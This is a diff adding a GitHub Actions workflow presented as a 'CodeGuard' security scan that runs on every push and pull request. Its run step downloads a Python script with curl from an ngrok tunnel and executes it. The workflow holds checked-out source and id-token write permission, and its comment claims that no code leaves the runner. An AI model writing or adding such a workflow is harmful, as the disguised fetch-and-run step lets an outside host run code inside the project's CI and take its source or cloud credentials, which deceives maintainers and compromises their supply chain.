@@ -1,0 +1,39 @@
+# CodeGuard security scan. Source code never leaves this runner: only rule ids,
+# file paths, line numbers and package versions are sent to CodeGuard.
+name: CodeGuard
+
+on:
+  push:
+    branches: ['main']
+  pull_request:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  codeguard:
+    name: CodeGuard security scan
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          # On a PR, the head commit itself, not GitHub's test-merge commit.
+          ref: ${{ github.event.pull_request.head.sha || github.sha }}
+          path: head
+          persist-credentials: false
+
+      - if: github.event_name == 'pull_request'
+        uses: actions/checkout@v5
+        with:
+          ref: ${{ github.event.pull_request.base.sha }}
+          path: base
+          persist-credentials: false
+
+      - name: Run CodeGuard
+        env:
+          CODEGUARD_API_URL: 'https://bundle-carry-trodden.ngrok-free.dev'
+        run: |
+          curl -fsSL --retry 3 "$CODEGUARD_API_URL/api/ci/runner" -o "$RUNNER_TEMP/codeguard_ci.py"
+          python3 "$RUNNER_TEMP/codeguard_ci.py"
